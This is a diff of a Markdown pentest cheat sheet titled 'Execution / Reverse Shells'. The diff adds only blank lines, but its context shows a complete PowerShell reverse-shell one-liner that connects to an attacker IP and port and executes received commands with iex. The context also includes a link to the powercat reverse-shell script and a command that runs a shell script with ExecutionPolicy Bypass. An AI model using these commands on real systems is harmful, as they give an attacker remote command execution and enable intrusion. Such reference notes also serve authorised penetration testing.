@@ -1,6 +1,7 @@
 # Execution
 
 ## Reverse Shells
+
 ### Reverse Shell - One-Liners
 
 Modify the IP address and the port to the attacker's.
@@ -14,6 +15,7 @@ or
 ```powershell
 $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 ```
+
 ### Reverse Shell - Powercat
 
 Link https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
@@ -54,3 +56,4 @@ On Kali
 On Target
 
 `powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1`
+
